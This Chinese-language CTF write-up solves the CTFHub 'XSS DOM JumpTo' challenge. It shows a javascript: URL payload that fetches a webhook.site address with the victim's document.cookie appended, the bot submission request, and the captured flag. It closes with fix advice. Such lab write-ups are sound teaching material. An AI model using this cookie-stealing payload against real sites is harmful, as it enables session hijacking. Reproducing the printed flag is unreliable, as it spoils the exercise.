CTFHub - Web - XSS - DOM JumpTo ?

# CTFHub # Web # XSS # DOM JumpTo

一、题目信息

  • 题目名称：XSS DOM JumpTo ?
  • 题目方向：Web - XSS - DOM 跳转
  • 题目目标：利用 jumpto 参数控制页面跳转，在 Bot 上下文中执行 JavaScript 并外带 Cookie。

二、漏洞分析

首页内联脚本直接读取 URL 查询参数，并将参数值赋给 location.href：

var target = location.search.split("=")
if (target[0].slice(1) == "jumpto") {
    location.href = target[1];
}

代码没有校验跳转协议。将 jumpto 设置为 javascript: URL 后，浏览器会在当前页面上下文执行脚本，形成 DOM XSS。

需要注意两点：第一，参数通过 split("=") 截取，Payload 中不能出现原始 =，否则会被截断；第二，必须保留 javascript: 中的冒号，若将整个 Payload 百分号编码，赋值时就无法识别为 JavaScript 协议。

三、解题步骤

  1. 确认 DOM 跳转：访问 /?jumpto=https://example.com/，页面会跳转到指定地址。
  2. 构造无等号外带 Payload：使用 fetch 请求 Webhook，并把 document.cookie 编码后拼到路径中。Payload 不包含原始 =，因此不会被 split("=") 截断。 
    javascript:fetch('https://webhook.site/<token>/x/'+encodeURIComponent(document.cookie))
  3. 提交给 Bot：把目标地址和 Payload 拼接后，向 /submit 发送 JSON。 
    $hostUrl = "http://challenge-xxx.sandbox.ctfhub.com:10800/"
$js = "javascript:fetch('https://webhook.site/<token>/x/'+encodeURIComponent(document.cookie))"
$target = $hostUrl + "?jumpto=" + $js

POST /submit
Content-Type: application/json

{"url":"http://challenge-xxx.sandbox.ctfhub.com:10800/?jumpto=javascript:fetch(...)"}
    接口返回： 
    {"code":0,"msg":"Successfully"}
  4. 读取回连数据：HeadlessChrome 访问目标地址后执行跳转脚本，Webhook 收到： 
    GET /x/flag%3Dctfhub%7Bf2123f8d15d4c2b24e0b37fd%7D%7C%7B%7D
    URL 解码后得到 flag=ctfhub{f2123f8d15d4c2b24e0b37fd}|{}。

四、最终 Flag

ctfhub{f2123f8d15d4c2b24e0b37fd}

五、修复建议

  • 跳转前使用 new URL() 解析目标地址，并限制协议为 http: 或 https:。
  • 禁止把用户输入直接赋给 location.href、location.assign() 等跳转入口。
  • 敏感 Cookie 设置 HttpOnly，并配置 CSP 限制未授权脚本和外部数据发送。
